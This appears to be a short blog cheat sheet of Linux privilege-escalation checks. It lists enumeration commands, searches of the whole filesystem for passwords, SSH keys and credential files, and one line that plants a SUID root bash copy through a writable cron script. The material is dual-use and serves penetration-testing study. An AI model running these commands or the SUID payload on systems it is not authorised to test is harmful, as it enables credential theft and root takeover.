---
title: Linux Privelege Escalation
date: "2022-03-21T00:00:00.000Z"
---

 📈 Recently I conducted some user privelege test / check in my Linux host machine here are the commands I used and useful resources.


###### Check Kernel Version 
```uname -a```

###### Check distro version
```cat /proc/version```

###### Check all the services running by root and check other services that running by different users
```ps aux | grep root```

###### Check what you can run as SUDO
```sudo -l```

###### Check all the users
```cat /etc/passwd```

###### Check history
```history```

###### Check all the connection
```netstat -ano```

###### Find no root Squashing, all the file you will be putting there will execute it as root
```cat /etc/exports```

###### Find any SUID
```find / -perm -u=s -type f 2>/dev/null```

###### Look for any password
```grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null```

###### Check shadow and passwd permission
```ls -la /etc/passwd```
```ls -la /etc/shadow```

###### Check capabilities
```getcap -r / 2>/dev/null```

###### Check schedulers and pay attention on the file permission, PATH and location if you can overwrite the file
```cat /etc/crontab```
```systemctl list-timers --all```

###### If this command is executed by root it will create file /tmp/bash  and if it execute by /tmp/bash -p it will create a shell root
```echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file.sh```

###### Look for any confidential files
```find / -name "id_rsa" 2> /dev/null```
```find / -name "authorized_keys" 2> /dev/null```
```find / -name "pass*" 2> /dev/null```

###### Use automated tools
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
https://github.com/rebootuser/LinEnum
https://github.com/mzet-/linux-exploit-suggester
https://github.com/sleventyeleven/linuxprivchecker
https://gtfobins.github.io/

